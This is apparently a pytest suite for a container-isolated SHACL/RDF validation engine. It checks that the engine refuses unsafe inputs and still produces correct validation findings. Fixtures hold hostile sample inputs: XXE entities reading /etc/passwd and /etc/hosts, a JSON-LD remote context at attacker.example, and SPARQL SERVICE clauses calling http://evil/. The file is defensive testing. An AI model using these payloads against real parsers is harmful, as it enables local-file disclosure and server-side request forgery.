"""Unit tests for the relocated SHACL engine (container copy).

This suite guards the engine that now runs *inside the isolation boundary*. The
container exists precisely so untrusted RDF and author-supplied SPARQL execute
away from the worker's credentials — so the security checks (XXE refusal, JSON-LD
remote-context refusal, SHACL-JS rejection, advanced-feature gating, embedded
SPARQL scrubbing, triple caps) are the most important things to pin here.

The happy-path tests confirm the engine still produces the same findings, signals,
and SHACL report it did in-process, so the move to the container is behaviour-
preserving for authors.

Tests that invoke pyshacl/SPARQL spawn the killable subprocess workers via
``python -m validator_backends.shacl.*``; pytest runs from the repo root, so the
package resolves on the subprocess's import path.
"""

from __future__ import annotations

from validator_backends.shacl import engine


# ── Fixtures: a minimal shapes graph + conforming / violating data ──
# The shape requires every ex:Person to carry exactly one ex:name string. This
# is the smallest graph that exercises a real SHACL constraint component
# (MinCountConstraintComponent) so the finding-mapping path has something to map.
SHAPES_TTL = """
@prefix sh: <http://www.w3.org/ns/shacl#> .
@prefix ex: <http://example.org/> .
@prefix xsd: <http://www.w3.org/2001/XMLSchema#> .

ex:PersonShape a sh:NodeShape ;
    sh:targetClass ex:Person ;
    sh:property [
        sh:path ex:name ;
        sh:minCount 1 ;
        sh:datatype xsd:string ;
    ] .
"""

CONFORMING_TTL = """
@prefix ex: <http://example.org/> .
ex:alice a ex:Person ; ex:name "Alice" .
"""

VIOLATING_TTL = """
@prefix ex: <http://example.org/> .
ex:bob a ex:Person .
"""


# ── Pre-parse safety: XXE ────────────────────────────────────────────────────
# An XXE payload in RDF/XML must be refused *before* rdflib parses it. This is a
# local-file / SSRF exfiltration vector; the isolation boundary makes a miss
# non-fatal, but the scrub is still the first line of defence.


def test_prevalidate_rejects_rdfxml_xxe():
    """RDF/XML with a DOCTYPE/ENTITY declaration is refused pre-parse."""
    payload = (
        '<?xml version="1.0"?>'
        '<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>'
        "<rdf:RDF/>"
    )
    error = engine.prevalidate_safety(payload, "xml")
    assert error is not None
    assert "XXE" in error or "external-entity" in error


def test_parse_rdf_refuses_xxe_via_prevalidation():
    """parse_rdf returns an error (not a graph) for an XXE RDF/XML payload."""
    payload = '<!DOCTYPE x [ <!ENTITY e SYSTEM "file:///etc/hosts"> ]><rdf:RDF/>'
    graph, error = engine.parse_rdf(payload, "xml")
    assert graph is None
    assert error is not None


# ── Pre-parse safety: JSON-LD remote context ─────────────────────────────────
# rdflib's JSON-LD plugin can dereference a string @context (SSRF + context
# substitution). String contexts are refused; inline objects/data: URIs pass.


def test_prevalidate_rejects_jsonld_remote_context():
    """A JSON-LD string @context (remote document reference) is refused."""
    payload = '{"@context": "http://attacker.example/ctx.jsonld", "@id": "ex:x"}'
    error = engine.prevalidate_safety(payload, "json-ld")
    assert error is not None
    assert "@context" in error


def test_prevalidate_allows_inline_jsonld_context():
    """An inline @context object is allowed (no document fetch)."""
    payload = '{"@context": {"ex": "http://example.org/"}, "@id": "ex:x"}'
    assert engine.prevalidate_safety(payload, "json-ld") is None


# ── Shape policy: SHACL-JS is never allowed ──────────────────────────────────


def test_inspect_shapes_policy_rejects_shacl_js():
    """A shape using sh:js is rejected — it would execute author JavaScript."""
    from rdflib import Graph

    shapes = Graph()
    shapes.parse(
        data="""
        @prefix sh: <http://www.w3.org/ns/shacl#> .
        @prefix ex: <http://example.org/> .
        ex:S a sh:NodeShape ;
            sh:targetClass ex:Person ;
            sh:js [ sh:jsFunctionName "v" ; sh:jsLibrary ex:lib ] .
        """,
        format="turtle",
    )
    error = engine.inspect_shapes_policy(
        shapes,
        advanced_shacl_requested=True,
        enable_advanced_features=True,
    )
    assert error is not None
    assert "SHACL-JS" in error


# ── Shape policy: advanced SHACL is double-gated ─────────────────────────────


def _advanced_shapes():
    from rdflib import Graph

    g = Graph()
    g.parse(
        data="""
        @prefix sh: <http://www.w3.org/ns/shacl#> .
        @prefix ex: <http://example.org/> .
        ex:S a sh:NodeShape ;
            sh:targetClass ex:Person ;
            sh:sparql [ a sh:SPARQLConstraint ;
                        sh:select "SELECT $this WHERE { $this ex:name ?n }" ] .
        """,
        format="turtle",
    )
    return g


def test_advanced_shacl_rejected_when_not_requested():
    """An advanced construct is rejected when the step didn't request advanced."""
    error = engine.inspect_shapes_policy(
        _advanced_shapes(),
        advanced_shacl_requested=False,
        enable_advanced_features=True,
    )
    assert error is not None
    assert "Advanced SHACL" in error


def test_advanced_shacl_rejected_when_deployment_gate_off():
    """Even when requested, advanced SHACL needs the deployment gate enabled."""
    error = engine.inspect_shapes_policy(
        _advanced_shapes(),
        advanced_shacl_requested=True,
        enable_advanced_features=False,
    )
    assert error is not None
    assert "SHACL_ENABLE_ADVANCED_FEATURES" in error


def test_advanced_shacl_allowed_when_both_gates_open():
    """With both gates open the advanced construct passes the policy check.

    (Embedded SPARQL with no forbidden tokens is permitted; this proves the gate
    composes correctly rather than blanket-refusing.)
    """
    error = engine.inspect_shapes_policy(
        _advanced_shapes(),
        advanced_shacl_requested=True,
        enable_advanced_features=True,
    )
    assert error is None


def test_embedded_sparql_service_rejected_regardless_of_gate():
    """A SERVICE clause in embedded SPARQL is refused even with gates open.

    The embedded-SPARQL scrub runs ahead of the advanced gate, so federation /
    exfiltration is blocked unconditionally.
    """
    from rdflib import Graph

    shapes = Graph()
    shapes.parse(
        data="""
        @prefix sh: <http://www.w3.org/ns/shacl#> .
        @prefix ex: <http://example.org/> .
        ex:S a sh:NodeShape ; sh:targetClass ex:Person ;
            sh:sparql [ a sh:SPARQLConstraint ;
              sh:select "SELECT $this WHERE { SERVICE <http://evil/> { $this ex:n ?x } }" ] .
        """,
        format="turtle",
    )
    error = engine.inspect_shapes_policy(
        shapes,
        advanced_shacl_requested=True,
        enable_advanced_features=True,
    )
    assert error is not None
    assert "SERVICE" in error


# ── Happy path: conforming vs violating ──────────────────────────────────────


def test_run_shacl_validation_conforming():
    """A conforming graph yields a report with zero violations."""
    from rdflib import Graph

    data = Graph()
    data.parse(data=CONFORMING_TTL, format="turtle")
    results, error = engine.run_shacl_validation(
        data,
        SHAPES_TTL,
        "",
        inference_mode="none",
        advanced_shacl=False,
        enable_advanced_features=False,
    )
    assert error is None
    signals = engine.extract_signals(
        data_graph=data,
        results_graph=results,
        parse_ok=True,
        parse_serialization="turtle",
    )
    assert signals["shacl_violation_count"] == 0


def test_run_shacl_validation_violation_maps_to_finding():
    """A missing required property produces a mapped ERROR finding with meta."""
    from rdflib import Graph

    data = Graph()
    data.parse(data=VIOLATING_TTL, format="turtle")
    results, error = engine.run_shacl_validation(
        data,
        SHAPES_TTL,
        "",
        inference_mode="none",
        advanced_shacl=False,
        enable_advanced_features=False,
    )
    assert error is None
    findings = engine.map_results_to_issues(results)
    assert findings, "expected at least one SHACL finding"
    assert any(f.severity == engine.SEV_ERROR for f in findings)
    # Finding carries the SHACL meta needed for Django to rebuild the issue.
    assert findings[0].meta.get("shacl_focus_node")
    assert findings[0].code.startswith("shacl.")


def test_run_shacl_validation_rejects_oversized_graph():
    """A data graph over the triple cap is refused before pyshacl runs."""
    from rdflib import Graph

    data = Graph()
    data.parse(data=CONFORMING_TTL, format="turtle")
    results, error = engine.run_shacl_validation(
        data,
        SHAPES_TTL,
        "",
        inference_mode="none",
        advanced_shacl=False,
        enable_advanced_features=False,
        max_data_triples=1,  # force the cap
    )
    assert results is None
    assert error is not None
    assert "triple" in error


# ── SPARQL-ASK assertions ────────────────────────────────────────────────────


def test_evaluate_sparql_assertions_true_and_false():
    """A true ASK produces no failure; a false ASK produces an ERROR finding."""
    from rdflib import Graph

    from validibot_shared.shacl.envelopes import SHACLSparqlAssertionSpec

    data = Graph()
    data.parse(data=CONFORMING_TTL, format="turtle")

    specs = [
        SHACLSparqlAssertionSpec(
            target_graph="data",
            query="ASK { ?s a <http://example.org/Person> }",
            severity="ERROR",
            description="has a person",
        ),
        SHACLSparqlAssertionSpec(
            target_graph="data",
            query="ASK { ?s <http://example.org/missing> ?o }",
            severity="ERROR",
            description="has a missing predicate",
        ),
    ]
    findings = engine.evaluate_sparql_assertions(
        assertions=specs,
        data_graph=data,
        results_graph=None,
        timeout_seconds=10,
    )
    # Only the second (false) assertion should produce a finding.
    assert len(findings) == 1
    assert findings[0].severity == engine.SEV_ERROR
    assert findings[0].code == "shacl.sparql_ask_failed"
    assert findings[0].assertion_id is None  # not set on these specs


def test_sparql_ask_service_is_scrubbed_at_runtime():
    """A SERVICE clause in an ASK is rejected by the runtime scrub → ERROR finding."""
    from rdflib import Graph

    from validibot_shared.shacl.envelopes import SHACLSparqlAssertionSpec

    data = Graph()
    data.parse(data=CONFORMING_TTL, format="turtle")

    spec = SHACLSparqlAssertionSpec(
        target_graph="data",
        query="ASK { SERVICE <http://evil/> { ?s ?p ?o } }",
        severity="ERROR",
    )
    findings = engine.evaluate_sparql_assertions(
        assertions=[spec],
        data_graph=data,
        results_graph=None,
        timeout_seconds=10,
    )
    assert len(findings) == 1
    assert findings[0].code == "shacl.sparql_ask_engine_error"
    assert findings[0].severity == engine.SEV_ERROR
